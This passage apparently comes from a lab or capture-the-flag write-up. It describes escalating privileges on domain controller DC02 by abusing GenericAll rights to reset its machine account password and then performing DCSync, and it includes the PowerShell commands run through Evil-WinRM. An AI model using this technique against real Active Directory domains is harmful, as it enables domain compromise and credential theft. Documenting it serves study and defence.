Privilege Escalation on DC02

Since the user jackie has GenericAll privilege against DC02.sub.poseidon.yzx computer, we can change virtual computer account.

Using changed passoword, I could request DCsync because virtual computer acccount is authenticated as sub.poseidon.yzx/DC02$ by Kerberos, and the acccount DC02$ has DCsync right as it is computer itself.

On the DC02, I ran the command below:

*Evil-WinRM* PS C:\Users\jackie\Documents> Import-Module ActiveDirectory
*Evil-WinRM* PS C:\Users\jackie\Documents> $NewPass = ConvertTo-SecureString 'Dc02NewP@ssw0rd!' -AsPlainText -Force
Set-ADAccountPassword -Identity 'DC02$' -Reset -NewPassword $NewPass
